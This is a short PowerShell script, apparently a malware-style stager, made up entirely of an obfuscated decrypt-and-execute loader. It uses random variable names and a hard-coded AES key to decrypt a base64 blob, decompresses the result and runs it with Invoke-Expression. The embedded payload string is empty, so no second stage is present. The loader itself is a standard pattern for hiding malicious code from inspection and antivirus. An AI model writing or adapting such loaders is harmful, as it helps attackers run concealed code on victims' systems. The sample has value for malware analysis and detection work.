$orgaapetf = [System.Convert]::FromBase64String("")
$qabxj = New-Object "System.Security.Cryptography.AesManaged"
$yonio = [System.Convert]::FromBase64String("GnRZNV/GH1sdTKWrS9bd8dIN+er89lVGFUt+Jg9EqoY=")
$qabxj.KeySize = 128
$qabxj.Key = $yonio
$qabxj.BlockSize = 128
$qabxj.Mode = [System.Security.Cryptography.CipherMode]::CBC
$qabxj.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$qabxj.IV = $orgaapetf[0..15]
$muddp = New-Object System.IO.MemoryStream
$vdvamhawz = New-Object System.IO.MemoryStream(,$qabxj.CreateDecryptor().TransformFinalBlock($orgaapetf,16,$orgaapetf.Length-16))
$ufrma = New-Object System.IO.Compression.DeflateStream $vdvamhawz, ([IO.Compression.CompressionMode]::Decompress)
$ufrma.CopyTo($muddp)
$vdvamhawz.Close()
$qabxj.Dispose()
$ufrma.Close()
$itfuzsakn = [System.Text.Encoding]::UTF8.GetString($muddp.ToArray())
Invoke-Expression($itfuzsakn)
